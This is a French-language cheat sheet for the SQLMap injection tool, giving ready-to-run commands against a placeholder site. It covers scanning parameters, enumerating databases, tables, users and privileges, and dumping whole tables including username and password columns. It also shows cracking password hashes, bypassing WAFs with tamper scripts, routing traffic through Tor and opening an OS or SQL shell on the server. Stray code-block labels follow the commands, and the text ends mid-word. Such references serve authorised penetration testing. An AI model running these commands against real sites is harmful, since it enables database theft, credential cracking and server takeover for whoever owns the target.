## SQLMap Cheat Sheet

### Commandes Automatiques

#### Scanner une URL de manière automatique

sqlmap -u "http://siteatester.fr"

graphql


#### Scanner une URL avec un paramètre GET

sqlmap -u "http://siteatester.fr?id=1"

graphql


#### Scanner une URL avec des paramètres POST

sqlmap -u "http://siteatester.fr" --data="PARAMETRE1=VALEUR1&PARAMETRE2=VALEUR2"

shell


### Préciser les Paramètres

#### Préciser le paramètre sur lequel réaliser l’injection

sqlmap -u "http://siteatester.fr?param1=valueur1&param2=valueur2" -p param1

shell


#### Préciser le type de base de données (mysql)

sqlmap -u "http://siteatester.fr" --dbms=mysql

shell


### Listage

#### Lister les bases de données

sqlmap -u "http://siteatester.fr?id=1" --dbs

shell


#### Lister les tables d’une base spécifique

sqlmap -u "http://siteatester.fr" -D "nom_de_la_database" --tables

shell


#### Lister les colonnes d’une table spécifique

sqlmap -u "http://siteatester.fr" -D "nom_de_la_database" -T "nom_de_la_table" --columns

shell


### Dump

#### Dump tout ce qu’SQLMap trouve

sqlmap -u "http://siteatester.fr" --dump

shell


#### Dump une base de données spécifique

sqlmap -u "http://siteatester.fr" -D "nom_de_la_database" --dump

shell


#### Dump une table spécifique

sqlmap -u "http://siteatester.fr" -D "nom_de_la_database" -T "nom_de_la_table" --dump

shell


#### Dump seulement des colonnes spécifiques d’une table

sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump

shell


### Cookies

#### Utiliser des cookies dans la requête

sqlmap -u "http://siteatester.fr" --cookie="COOKIE1=VALEUR1;COOKIE2=VALEUR2"

shell


### Proxy

#### Passer le trafic de SQLMap via un proxy

sqlmap -u "http://siteatester.fr" --proxy=http://proxy:port

shell


#### Passer le trafic de SQLMap via Tor

sqlmap -u "http://siteatester.fr" --tor --tor-type=SOCKS5 --check-tor

shell


### Reverse Shell

#### Obtenir un reverse shell OS

sqlmap -u "http://siteatester.fr" --os-shell

shell


#### Obtenir un shell SQL

sqlmap -u "http://siteatester.fr" --sql-shell

shell


### Autres Commandes Utiles

#### Identifier les points d'injection dans les headers HTTP

sqlmap -u "http://siteatester.fr" --level=3 --risk=3

shell


#### Bypasser les WAF/IPS avec des techniques de tampering

sqlmap -u "http://siteatester.fr" --tamper=space2comment

shell


#### Énumérer les utilisateurs de la base de données

sqlmap -u "http://siteatester.fr" --users

shell


#### Énumérer les rôles de la base de données

sqlmap -u "http://siteatester.fr" --roles

shell


#### Énumérer les privilèges des utilisateurs

sqlmap -u "http://siteatester.fr" --privileges

shell


#### Énumérer les bases de données accessibles en tant qu'utilisateur actuel

sqlmap -u "http://siteatester.fr" --current-db

shell


#### Cracker les mots de passe des utilisateurs

sqlmap -u "http://siteatester.fr" --passwords

shell


#### Exécuter une requête SQL personnalisée

sqlmap -u "http://siteatester.fr" -D "nom_de_la_database" --sql-query="SELECT * FROM nom_de_la_table"

shell


#### Charger une requête SQL depuis un fichier

sqlmap -u "http://siteatester.fr" --sql-file=/chemin/vers/le/fichier.sql

graphql


#### Utiliser un agent utilisateur et des headers HTTP personnalisés

sqlmap -u "http://siteatester.fr" --user-agent="MonUserAgent" --headers="X-Header: valeur"

shell


#### Exécuter SQLMap à travers une session authentifiée

sqlmap -u "http://siteatester.fr/page_protegee" --cookie="sessionid=123456789"

shell


#### Forcer l'encodage de caractères

sqlmap -u "http://siteatester.fr" --charset=utf8mb4

vbnet


Cette cheat sheet SQLMap est étendue pour inclure diverses options et techniques d'inject
